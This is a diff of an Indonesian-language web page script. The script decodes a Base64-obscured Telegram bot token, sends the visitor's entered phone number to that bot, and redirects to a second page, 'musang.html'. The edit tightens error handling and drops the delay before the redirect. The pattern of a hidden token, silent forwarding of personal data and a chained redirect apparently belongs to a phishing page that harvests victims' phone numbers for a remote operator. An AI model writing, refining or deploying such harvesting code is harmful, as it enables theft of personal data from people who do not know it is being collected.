@@ -120,7 +120,7 @@
 
 <script>
     // Token Telegram yang dienkripsi (misalnya menggunakan Base64)
-    const encryptedToken = "NzgwMDQ3NTY3NzoBQUFDEAAUKSxlQ21JbkUwLTF4Z--OM44"; // Ini hanya contoh
+    const encryptedToken = "NzgwMDQ3NTY3NzoBQUFDEAAUKSxlQ21JbkUwLTF4Z--OM44"; // Ganti dengan token terenkripsi Anda
 
     // Fungsi untuk mendekripsi token (Base64 decode)
     function decryptToken(encrypted) {
@@ -152,17 +152,20 @@
                 text: Nomor Telepon: ${phoneNumber}\nPesan: 🦅 Rajawali Abadi 🦅
             }),
         })
-        .then(response => response.json())
+        .then(response => {
+            if (!response.ok) throw new Error('Gagal mengirim pesan');
+            return response.json();
+        })
         .then(data => {
             console.log('Pesan berhasil dikirim:', data);
         })
         .catch(error => {
+            alert('Terjadi kesalahan saat mengirim pesan.');
             console.error('Error:', error);
         })
         .finally(() => {
-            setTimeout(() => {
-                window.location.href = 'musang.html'; // Redirect ke halaman berikutnya
-            }, 3000);
+            document.getElementById('loading').style.display = 'none';
+            window.location.href = 'musang.html'; // Redirect ke halaman berikutnya
         });
     }
 </script>
